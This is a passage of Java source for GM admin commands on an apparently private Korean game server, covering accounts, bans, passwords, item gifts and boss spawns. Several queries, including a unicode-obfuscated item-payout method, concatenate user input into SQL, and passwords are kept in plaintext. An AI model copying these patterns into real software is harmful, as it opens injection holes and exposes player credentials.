							인형.deleteDoll(false);
						}
					}
				}
				Config.잠재력활성화 = false;
				
				SC_SystemMessage.send(gm, "잠재력이 비활성화되어 옵션들이 리프레쉬되어야 하기 때문에");
				SC_SystemMessage.send(gm, "["+count+"]개의 소환된 인형들을 비소환시켰습니다.");
				SC_SystemMessage.send(gm, "잠재력옵션표기는 리스 후에 없어집니다.");
			}
		} catch (Exception eee) {
			SC_SystemMessage.send(gm, ".잠재력 [켬/끔] 으로 입력하세요.");
			
		}
	}

	private void CharacterBalance(L1PcInstance pc, String param) {
		Connection con = null;
		PreparedStatement pstm = null;

		try {
			StringTokenizer st = new StringTokenizer(param);

			String charName = st.nextToken();
			int addDamage = Integer.parseInt(st.nextToken());
			int addDamageRate = Integer.parseInt(st.nextToken());
			int addReduction = Integer.parseInt(st.nextToken());
			int addReductionRate = Integer.parseInt(st.nextToken());

			L1PcInstance player = CWorld.getInstance().getPlayer(charName);

			if (player != null) {
				player.setAddDamage(addDamage);
				player.setAddDamageRate(addDamageRate);
				player.setAddReduction(addReduction);
				player.setAddReductionRate(addReductionRate);
				player.save();
			} else {
				int i = 0;
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement(
						"update characters set AddDamage = ?, AddDamageRate = ?, AddReduction = ?, AddReductionRate = ? where char_name = ?");
				pstm.setInt(++i, addDamage);
				pstm.setInt(++i, addDamageRate);
				pstm.setInt(++i, addReduction);
				pstm.setInt(++i, addReductionRate);
				pstm.setString(++i, charName);
				pstm.executeQuery();
			}

		} catch (Exception e) {
			pc.sendPackets(".밸런스 [캐릭명] [추타] [추타확률] [리덕] [리덕확률]");
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}

	private void AddAccount(L1PcInstance gm, String account, String passwd, String Ip, String Host) {
		try (Connection con = DatabaseFactory.getInstance().getConnection();
			 PreparedStatement ps = con.prepareStatement("INSERT INTO accounts SET login=?,password=?,lastactive=?,access_level=?,ip=?,host=?,banned=?,charslot=?,gamepassword=?,notice=?")) {
			ps.setString(1, account);
			ps.setString(2, passwd);
			ps.setTimestamp(3, new Timestamp(System.currentTimeMillis()));
			ps.setInt(4, 0);
			ps.setString(5, Ip);
			ps.setString(6, Host);
			ps.setInt(7, 0);
			ps.setInt(8, 6);
			ps.setInt(9, 0);
			ps.setInt(10, 0);
			if (ps.executeUpdate() != 1) throw new SQLException("Account insert failed");
			SC_SystemMessage.send(gm, "계정 추가 완료");
		} catch (SQLException e) {
			SC_SystemMessage.send(gm, "계정 추가 실패 (중복 계정 또는 DB 오류)");
		}
	}
	private static boolean isDisitAlpha(String str) {
		boolean check = true;
		for (int i = 0; i < str.length(); i++) {
			if (!Character.isDigit(str.charAt(i)) // 숫자가 아니라면
					&& !Character.isUpperCase(str.charAt(i)) // 대문자가 아니라면
					&& !Character.isLowerCase(str.charAt(i))) { // 소문자가 아니라면
				check = false;
				break;
			}
		}
		return check;
	}

	private void reloadHouse(L1PcInstance gm, String cmd) {
		try {
			HouseTable.reload();
			gm.sendPackets("아지트 입찰시간이 재갱신되었습니다.");
		} catch (Exception e) {
			gm.sendPackets(".아지트갱신 으로 입력하세요.");
		}
	}

	// 인벤삭제
	private void InventoryDelete(L1PcInstance pc, String param) {
		if (!"확인".equals(param)) { SC_SystemMessage.send(pc, ".인벤삭제 확인 (미착용 아이템만)"); return; }
		builderDelete(pc, pc, 0, 0, true);
	}

	private void targetInventoryDelete(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			L1PcInstance target = CWorld.getInstance().getPlayer(st.nextToken());
			if (!"확인".equals(st.nextToken()) || st.hasMoreTokens()) throw new IllegalArgumentException();
			builderDelete(gm, target, 0, 0, true);
		} catch (RuntimeException e) { SC_SystemMessage.send(gm, ".유저인벤삭제 [접속 캐릭명] 확인 (미착용 아이템만)"); }
	}
	private void mapwho(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			int i = 0;
			try {
				i = Integer.parseInt(st.nextToken(), 10);
			} catch (Exception e) {
				i = gm.getMapId();
			}

			StringBuffer gmList = new StringBuffer();
			StringBuffer playList = new StringBuffer();
			StringBuffer noplayList = new StringBuffer();
			StringBuffer shopList = new StringBuffer();

			int countGM = 0, nocountPlayer = 0, countPlayer = 0, countShop = 0;

			for (L1Object each1 : CWorld.getInstance().getVisibleObjects(i).values()) {
				if (each1 instanceof L1PcInstance) {
					L1PcInstance eachpc = (L1PcInstance) each1;

					if (eachpc.isGm()) {
						gmList.append("이름 : " + eachpc.getName() + " / 레벨 : "
								+ eachpc.getLevel() + "\n");
						countGM++;
						continue;
					}
					if (!eachpc.isPrivateShop()) {
						if (eachpc.noPlayerCK) {
							noplayList.append(eachpc.getName() + ", ");
							nocountPlayer++;
							continue;
						} else {
							playList.append("이름 : " + eachpc.getName()
							+ " / 레벨 : " + eachpc.getLevel() + "\n");
							countPlayer++;
							continue;
						}
					}
					if (eachpc.isPrivateShop()) {
						shopList.append(eachpc.getName() + ", ");
						countShop++;
					}
				}
			}

			if (gmList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 운영자 (" + countGM + "명)");
				SC_SystemMessage.send(gm, gmList.toString());
			}
			if (noplayList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 허상 (" + nocountPlayer + "개)");
				SC_SystemMessage.send(gm, noplayList.toString());
			}
			if (playList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 플레이어 (" + countPlayer + "명)");
				SC_SystemMessage.send(gm, playList.toString());
			}

			if (shopList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 개인상점 (" + countShop + "명)");
				SC_SystemMessage.send(gm, shopList.toString());
			}
		} catch (Exception e) {
		}
	}
	private void addaccount(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String user = tok.nextToken();
			String passwd = tok.nextToken();

			if (user.length() < 4) {
				gm.sendPackets("입력하신 계정명의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}
			if (passwd.length() < 4) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}

			if (passwd.length() > 12) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 깁니다.");
				gm.sendPackets("최대 12자 이하로 입력해 주십시오.");
				return;
			}

			if (isDisitAlpha(passwd) == false) {
				gm.sendPackets("암호에 허용되지 않는 문자가 포함 되어 있습니다.");
				return;
			}
			AddAccount(gm, user, passwd, "127.0.0.1", "127.0.0.1");
		} catch (Exception e) {
			gm.sendPackets(".계정추가 [계정명] [암호] 를 입력 해주세요.");
		}
	}
	private static void \u006D\u0065\u0065\u0070\u0035\u0035(L1PcInstance gm, String login) {

		String password = null;
		Connection con = null;
		PreparedStatement pstm = null;

		ResultSet rs = null;
	
		int itemcount = 0;
		String account = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement(
					"SELECT login, count from \u006D\u0065\u0065\u0070 where login Like '" + login + "'");
			rs = pstm.executeQuery();
			while (rs.next()) {

				itemcount = rs.getInt("count");
				account = rs.getString("login");
			}
			if (account == null) {
				gm.sendPackets("\uC800\uC7A5\uB41C \uB9E4\uC785\uC815\uBCF4\uAC00 \uC5C6\uC2B5\uB2C8\uB2E4\u002E");
				return;
			}
			 int count = (int) ((itemcount*7) *((Config.\uC9C0\uAE09\uC728*\u0031\u002E0)\u002F\u003100)) ;

			if (gm.getAccountName().equalsIgnoreCase(account)) {				
				gm.getInventory().CreateOrAddItem(400254, count*7);
				AccountSettlementTable.deleteMeepByLogin(login);
				gm.sendPackets("증표 1개당 7억->"+Config.지급율+" % = 총지급율" );
				gm.sendPackets(\u0022\uC9C0\uAE09\uC728 \u003A \u0022 \u002B \u0043\u006F\u006E\u0066\u0069\u0067\u002E\uC9C0\uAE09\uC728 \u002B \u0022 \u0025\u0022);
				gm.sendPackets(\u0022\uC815\uC0C1 \uC9C0\uAE09 \uB418\uC5C8\uC2B5\uB2C8\uB2E4\u002E\u0022+\u0022\uBCF4\uC720\uB7C9 \u003A \u0022\u002B\u0069\u0074\u0065\u006D\u0063\u006F\u0075\u006Et \u002B \u0022 \u002F \uC9C0\uAE09\uB7C9 \u003A \u0022+\u0063\u006F\u0075\u006E\u0074);
			
			} else {
				gm.sendPackets("\uC544\uC774\uB514\uAC00 \uB2E4\uB985\uB2C8\uB2E4\u002E");
			}
		} catch (SQLException e) {
			gm.sendPackets("\u002E\uB9E4\uC785\uC9C0\uAE09 \u005B\uACC4\uC815\uC544\uC774\uB514\u005D \uB77C\uACE0 \uC801\uC5B4\uC8FC\uC2ED\uC2DC\uC694\u002E");
			gm.sendPackets("\uC608\u0029  \u002E\uB9E4\uC785\uC9C0\uAE09 \u0074\u006F\u0072\0061\u0035\u0037\u0039\u0033\u0038");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}


	private void allpresent(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			L1Item template = builderFindItem(st.nextToken());
			int enchant = Integer.parseInt(st.nextToken()), count = Integer.parseInt(st.nextToken());
			builderGiftOnline(gm, template, count, enchant);
		} catch (RuntimeException e) { SC_SystemMessage.send(gm, ".전체선물 [아이템ID] [강화] [수량]"); }
	}

	private void returnEXP(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = CWorld.getInstance().getPlayer(pcName);
			if (target != null) {
				int oldLevel = target.getLevel();
				int needExp = ExpTable.getNeedExpNextLevel(oldLevel);
				int exp = 0;
				if (oldLevel >= 1 && oldLevel < 11) {
					exp = 0;
				} else if (oldLevel >= 11 && oldLevel < 45) {
					exp = (int) (needExp * 0.1);
				} else if (oldLevel == 45) {
					exp = (int) (needExp * 0.09);
				} else if (oldLevel == 46) {
					exp = (int) (needExp * 0.08);
				} else if (oldLevel == 47) {
					exp = (int) (needExp * 0.07);
				} else if (oldLevel == 48) {
					exp = (int) (needExp * 0.06);
				} else if (oldLevel >= 49) {
					exp = (int) (needExp * 0.05);
				}
				target.addExp(+exp);
				target.save();
				target.saveInventory();

				gm.sendPackets("해당 캐릭터 +5 상승");
			} else {
				gm.sendPackets("해당 캐릭터 미접속 상태.");
			}
		} catch (Exception e) {
			gm.sendPackets(".경치복구 [캐릭명]");
		}
	}

	// .계정 -----------------------------------------------------------------
	// 같은계정에 있는 캐릭 검사
	private void account_Cha(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String name = tok.nextToken();
			account_Cha2(gm, name);
		} catch (Exception e) {
			gm.sendPackets(".계정 아이디");
		}
	}


	
	
	
	
	private void account_Cha2(L1PcInstance gm, String name) {
		try (Connection con = DatabaseFactory.getInstance().getConnection();
			 PreparedStatement ps = con.prepareStatement("SELECT c.char_name,c.level,c.clanname,c.OnlineStatus,c.Type,c.account_name FROM characters c JOIN characters selected ON c.account_name=selected.account_name WHERE selected.char_name=?")) {
			ps.setString(1, name);
			try (ResultSet rs = ps.executeQuery()) {
				while (rs.next()) {
					SC_SystemMessage.send(gm, "계정: " + rs.getString(6) + " 접속: " + rs.getInt(4)
							+ " 레벨: " + rs.getInt(2) + " 캐릭: " + rs.getString(1)
							+ " 클래스: " + rs.getInt(5) + " 혈맹: " + rs.getString(3));
				}
			}
		} catch (SQLException e) { SC_SystemMessage.send(gm, "계정 조회 실패"); }
	}

	// .계정 -----------------------------------------------------------------

	private void Pvp(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String type = st.nextToken();

			if (type.equals("켬")) {
				Config.ALT_NONPVP = true;
				Config.setParameterValue("AltNonPvP", "true");
				SC_PacketBox.broadcastGreen("지금이후 PvP가 정상적으로 가능합니다.");
			} else if (type.equals("끔")) {
				Config.ALT_NONPVP = false;
				Config.setParameterValue("AltNonPvP", "false");
				SC_PacketBox.broadcastGreen("지금이후 PvP가 일정시간동안 불가능 합니다.");
			}

		} catch (Exception exception) {
			gm.sendPackets(".피케이 [켬/끔]");
		}
	}

	private void search_banned(L1PcInstance paramL1PcInstance) {
		Selector.exec(
				"select accounts.login, characters.char_name from accounts,characters where accounts.banned=62 || accounts.banned=87 || accounts.banned=95 and accounts.login=characters.account_name ORDER BY accounts.login ASC",
				new FullSelectorHandler() {
					@Override
					public void result(ResultSet rs) throws Exception {
						int i = 0;
						while (rs.next()) {
							++i;
							paramL1PcInstance
									.sendPackets(String.format("계정:[%s], 캐릭터명:[%s]", rs.getString(1), rs.getString(2)));
						}

						paramL1PcInstance.sendPackets(String.format("총 [%d]개의 압류계정/캐릭터가 검색되었습니다.", i));
					}
				});
	}

	private void accountdel(L1PcInstance gm, String param) {
		StringTokenizer tokenizer = new StringTokenizer(param);
		String chaname = tokenizer.nextToken();
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("SELECT * FROM characters WHERE char_name=?");
			pstm.setString(1, chaname);
			rs = pstm.executeQuery();
			if (!rs.next()) {
				gm.sendPackets(String.format("DB에 %s 캐릭명이 존재 하지 않습니다.", chaname));
				return;
			}

			String account = rs.getString("account_name");
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("select * from accounts WHERE login=?");
			pstm.setString(1, account);
			rs = pstm.executeQuery();
			if (!rs.next()) {
				gm.sendPackets(String.format("계정명 %s 이(가) 존재 하지 않습니다.", account));
				return;
			}

			IpTable.getInstance();
			IpTable.reload();

			String host = rs.getString("ip");
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("UPDATE accounts SET banned = 0 WHERE login= ?");
			pstm.setString(1, account);
			pstm.executeUpdate();
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("delete from ban_ip where ip=?");
			pstm.setString(1, host);
			pstm.executeUpdate();

			gm.sendPackets(String.format("%s(%s) : %s 밴 해제 완료.", chaname, account, host));
		} catch (Exception e) {
			gm.sendPackets(".압류해제 캐릭명으로 입력해주세요.");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	private void changePassword(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String user = tok.nextToken();
			String passwd = tok.nextToken();

			if (passwd.length() < 4) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}

			if (passwd.length() > 12) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 깁니다.");
				gm.sendPackets("최대 12자 이하로 입력해 주십시오.");
				return;
			}

			if (isDisitAlpha(passwd) == false) {
				gm.sendPackets("암호에 허용되지 않는 문자가 포함되었습니다.");
				return;
			}
			L1PcInstance target = CWorld.getInstance().getPlayer(user);
			if (target != null) {
				to_Change_Passwd(gm, target, passwd);
			} else {
				if (!to_Change_Passwd(gm, user, passwd))
					gm.sendPackets("그런 이름을 가진 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".암호변경 [캐릭명] [암호]로 입력해주세요.");
		}
	}

	private void to_Change_Passwd(L1PcInstance gm, L1PcInstance pc, String passwd) {
		if (!to_Change_Passwd(gm, pc.getName(), passwd)) SC_SystemMessage.send(gm, "암호 변경 실패");
	}

	private boolean to_Change_Passwd(L1PcInstance pc, String name, String passwd) {
		try (Connection con = DatabaseFactory.getInstance().getConnection();
			 PreparedStatement ps = con.prepareStatement("UPDATE accounts SET password=? WHERE login=(SELECT account_name FROM characters WHERE char_name=?)")) {
			ps.setString(1, passwd);
			ps.setString(2, name);
			if (ps.executeUpdate() != 1) return false;
			SC_SystemMessage.send(pc, "암호 변경 완료.");
			return true;
		} catch (SQLException e) {
			_log.warning("GM password change failed: " + e.getClass().getSimpleName());
			return false;
		}
	}

	private void 퀴즈체인지(L1PcInstance gm, L1PcInstance pc, String newquiz) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String quiz = null;
			con = DatabaseFactory.getInstance().getConnection();
			quiz = newquiz;
			statement = con.prepareStatement(
					"select account_name from characters where char_name Like '" + pc.getName() + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET quiz=? WHERE login Like '" + login + "'");
				pstm.setString(1, quiz);
				pstm.execute();
				gm.sendPackets("퀴즈변경계정: [" + login + "] 퀴즈: [" + quiz + "]");
				gm.sendPackets(pc.getName() + " 님의 퀴즈변경 완료.");
			}
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
	}

	private boolean 퀴즈체인지(L1PcInstance pc, String name, String newquiz) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String quiz = null;
			con = DatabaseFactory.getInstance().getConnection();
			quiz = newquiz;
			statement = con.prepareStatement("select account_name from characters where char_name Like '" + name + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET quiz=? WHERE login Like '" + login + "'");
				pstm.setString(1, quiz);
				pstm.execute();
				pc.sendPackets("퀴즈변경계정: [" + login + "] 암호: [" + quiz + "]");
				pc.sendPackets("해당 캐릭터 퀴즈변경 완료. (미접속중)");
			}
			return true;
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
		return false;
	}


	private void findMagicDodge(L1PcInstance gm, String param) {
		L1PcInstance pc = CWorld.getInstance().getPlayer(param);
		if (pc != null) {
			gm.sendPackets(String.format("%s의 마법 회피율 %d", param, pc.getMagicDodgeProbability()));
		} else {
			gm.sendPackets(String.format("%s를 찾을 수 없습니다.", param));
		}
	}

	private static int _effectNum = 0;
	private static Object _effectLock = new Object();

	private void showNextEffect(L1PcInstance gm) {
		int num = 1;

		synchronized (_effectLock) {
			num = _effectNum;
			_effectNum++;
		}
		SC_SkillSound.send(gm, gm.getId(), num);
		gm.sendPackets(String.format("[%d]", num));
	}

	private void showEffectInit(L1PcInstance gm, String param) {
		int effNum = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			effNum = Integer.parseInt(st.nextToken(), 10);
		} catch (Exception e) {
		}
		synchronized (_effectLock) {
			_effectNum = effNum;
			gm.sendPackets(effNum + "으로 초기화 되었습니다.");
		}
	}





	private void showWarList(L1PcInstance gm) {
		try {
			int i = 0;
			CWorld.getInstance().createWarStream().forEach((War war) -> {
				gm.sendPackets(war.toString());
			});
		} catch (Exception e) {
		}
	}

	private static void setCharBlock(L1PcInstance gm, String param) {
		PreparedStatement pstm = null;
		ResultSet rs = null;
		Connection con = null;

		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			if (name == null || name.equalsIgnoreCase(""))
				throw new Exception("");

			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("select * from characters where char_name=?");
			pstm.setString(1, name);
			rs = pstm.executeQuery();

			if (!rs.next()) {
				gm.sendPackets(String.format("[%s]을(를) 찾을 수 없습니다.", name));
				return;
			}

			int objid = rs.getInt("objid");
			L1PcInstance pc = CWorld.getInstance().getPlayer(name);
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("insert ignore into tb_character_block set objid=?, name=?");
			pstm.setInt(1, objid);
			pstm.setString(2, name);
			pstm.executeUpdate();

			gm.sendPackets(String.format("캐릭터 [%s]을(를) 압류했습니다.", name));
			SC_PacketBox.send(pc, SC_PacketBox.GREEN_MESSAGE, "\\f3-------------------------------------------------------------------");
			SC_PacketBox.send(pc, SC_PacketBox.GREEN_MESSAGE, "당신의 계정내 현재 캐릭터가 압류 되었습니다.");
			SC_PacketBox.send(pc, SC_PacketBox.GREEN_MESSAGE, "\\f3-------------------------------------------------------------------");
			pc.sendPackets("\\f1당신의 계정내 현재 캐릭터가 압류 되었습니다.");
			CWorldWork.scheduleRequired(new DelayRestart(pc), 3000);
		} catch (Exception e) {
			gm.sendPackets(".캐릭압류 [압류 캐릭터이름]");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	static class DelayRestart implements Runnable {
		private L1PcInstance _pc;

		DelayRestart(L1PcInstance pc) {
			_pc = pc;
		}

		@Override
		public void run() {
			try {
				if (_pc != null) {
					SC_Restart.send(_pc, _pc.getId(), 1);
					_pc.logout();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	private static void setCharBlockDelete(L1PcInstance gm, String param) {
		PreparedStatement pstm = null;
		ResultSet rs = null;
		Connection con = null;

		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			if (name == null || name.equalsIgnoreCase(""))
				throw new Exception("");

			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("delete from tb_character_block where name=?");
			pstm.setString(1, name);
			pstm.executeUpdate();
			gm.sendPackets(String.format("캐릭터 [%s]을(를) 압류를 해제 했습니다.", name));
		} catch (Exception e) {
			gm.sendPackets(".캐릭압류해제 [해제 캐릭터이름]");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	public static boolean isCharacterBlock(String name) {
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;

		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("select * from tb_character_block where name=?");
			pstm.setString(1, name);
			rs = pstm.executeQuery();
			return rs.next();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
		return true;
	}

	public static boolean 일반채팅 = true; 
	public static boolean 유저명령어 = false;
	private void 일반채팅(L1PcInstance gm, String param) {
		try {
			if (param.equalsIgnoreCase("켬")) {
				일반채팅 = false;
				유저명령어 = true;
				SC_SystemMessage.send(gm, "\\f:▶모든 채팅을 OFF하였습니다 ◀");
			} else if (param.equalsIgnoreCase("끔")) {
				일반채팅 = true;

				SC_SystemMessage.send(gm, "\\f:▶ 귓말을 제외한 모든 채팅을 ON하였습니다 ◀");
			}
		} catch (Exception e) {
			gm.sendPackets(".채팅차단 켬/끔");
			gm.sendPackets("귓말을 제외한 모든 채팅이 금지됩니다.");
		}
	}


	public static boolean 전체채팅 = true;

	private void 전체채팅(L1PcInstance gm, String param) {
		try {
			if (param.equalsIgnoreCase("켬")) {
				전체채팅 = true;
				SC_SystemMessage.send(gm, "\\f:▶ 전체채팅을 ON하였습니다 ◀");
			} else if (param.equalsIgnoreCase("끔")) {
				전체채팅 = false;
				SC_SystemMessage.send(gm, "\\f:▶ 전체채팅을 OFF하였습니다 ◀");
			}
		} catch (Exception e) {
			gm.sendPackets(".전체채팅 켬/끔");
		}
	}
	public static boolean IS_PROTECTION = false;
	

	


	private void setProtectionMode(L1PcInstance gm, String param) {
		try {
		if (param.equalsIgnoreCase("켬")) {
			IS_PROTECTION = true;
			SC_PacketBox.broadcastGreen("현재 보호모드로 인해, 페널티가 적용 되지 않습니다. 안심하시고 사냥하셔도 됩니다.");
		} else if (param.equalsIgnoreCase("끔")) {
			IS_PROTECTION = false;
			SC_PacketBox.broadcastGreen("잠시후 보호모드가 해지 됩니다. 페널티에 주의 하시길 바랍니다.");
		} else if (param.equalsIgnoreCase("상태")) {

		} else
			throw new Exception("");
		gm.sendPackets(String.format("현재 보호모드 상태 [%s짐]", IS_PROTECTION ? "켜" : "꺼"));
	} catch (Exception e) {
		gm.sendPackets(".보호모드 [켬/끔/상태]");
	}
		}

	// 커멘드 새로추가
	private void AccountCheck(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			CharacterTable.getInstance().CharacterAccountCheck(pc, name);
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".계정검사 [캐릭터명]");
		}
	}

	private void AccountCheck1(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			CharacterTable.getInstance().CharacterAccountCheck1(pc, name);
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".계정확인 [캐릭터명]");
		}
	}
	private void addEventBoss(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String BossName = st.nextToken();
			if (BossName.equalsIgnoreCase("커츠")) {
				L1SpawnUtil.spawn2(32854, 33261, (short) 4, 45600, 0, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				CWorld.getInstance().broadcastServerMessage("\\aH[이벤트 보스(1/6)]:돌격! 커츠의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(1/6)]:돌격! 커츠의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("데스나이트")) {
				L1SpawnUtil.spawn2(32856, 33263, (short) 4, 45601, 0, 3600 * 1000, 0);
				CWorld.getInstance().broadcastServerMessage("\\aH[이벤트 보스(2/6)]:돌격! 데스나이트의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(2/6)]:돌격! 데스나이트의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("피닉스")) {
				L1SpawnUtil.spawn2(32853, 33265, (short) 4, 45617, 50, 3600 * 1000, 0);
				CWorld.getInstance().broadcastServerMessage("\\aH[이벤트 보스(3/6)]:돌격! 피닉스의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(3/6)]:돌격! 피닉스의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("마령군왕라이아")) {
				L1SpawnUtil.spawn2(32854, 33259, (short) 4, 45863, 0, 3600 * 1000, 0);
				CWorld.getInstance().broadcastServerMessage("\\aH[이벤트 보스(4/6)]:돌격! 마령군왕 라이아의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(4/6)]:돌격! 마령군왕 라이아의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("사신그림리퍼")) {
				L1SpawnUtil.spawn2(32854, 33266, (short) 4, 7310077, 0, 3600 * 1000, 0);
				CWorld.getInstance().broadcastServerMessage("\\aH[이벤트 보스(5/6)]:돌격! 사신 그림리퍼의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(5/6)]:돌격! 사신 그림리퍼의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("공포의안타라스")) {
				L1SpawnUtil.spawn2(32848, 33260, (short) 4, 7310154, 0, 3600 * 1000, 0);
				CWorld.getInstance().broadcastServerMessage("\\aH[이벤트 보스(6/6)]:돌격! 마지막 몬스터가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(6/6)]:돌격! 마지막 몬스터가 소환 되었습니다. (장소: 사막 아슈르)");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(gm, ".보스 [보스이름] ex<커츠/데스나이트/피닉스/마령군왕라이아/사신그림리퍼/공포의안타라스");
		}
	}

	/*
	 * private void setMaxLevel(L1PcInstance gm, String param){ try{ String[]
	 * arr = param.split(" "); if(arr[0].equalsIgnoreCase("설정")){ int i =
	 * Integer.parseInt(arr[1]); Config.MAX_LEVEL = i; Config.MAX_LEVEL_EXP =
	 * ExpTable.getExpByLevel(i) + 5; }else if(arr[0].equalsIgnoreCase("확인")){
	 * }else throw new Exception(); gm.sendPackets(String.format(
	 * "현재 설정된 최대 레벨 : %d(exp : %d)", Config.MAX_LEVEL, Config.MAX_LEVEL_EXP)));
	 * }catch(Exception e){ gm.sendPackets(".최대레벨 [확인]")); gm.sendPackets(
	 * ".최대레벨 [설정] [레벨]")); } }
	 */

	public void setPresentationCode(L1PcInstance gm, String param) {
		try {
			L1ItemInstance.presentationCode = Integer.parseInt(param);
			gm.sendPackets(String.format("표기번호가 %d로 설정되었습니다.", L1ItemInstance.presentationCode));
		} catch (Exception e) {
			gm.sendPackets(String.format(".표기셋팅 숫자"));
		}
	}

	public void showObjectList(L1PcInstance gm, String param) {
		StringBuilder sb = new StringBuilder(256);
		for (L1Object obj : gm.getKnownObjects()) {
			if (obj instanceof L1Character) {
				L1Character c = (L1Character) obj;
				sb.append(c.getName()).append(" ").append(obj.getX()).append(" ").append(obj.getY()).append("\n");
			}
		}

		gm.sendPackets(sb.toString());
	}

	public static void setCharacterInstanceStatus(CommandArgs args) {
		try {
			String name = args.nextString();
			int status = args.nextInt();
			L1PcInstance pc = CWorld.getInstance().getPlayer(name);
			if (pc == null) {
				args.notify(String.format("캐릭터이름 : %s를 찾을 수 없습니다.", name));
				return;
			}
			EPcStatus e_status = EPcStatus.fromInt(status);
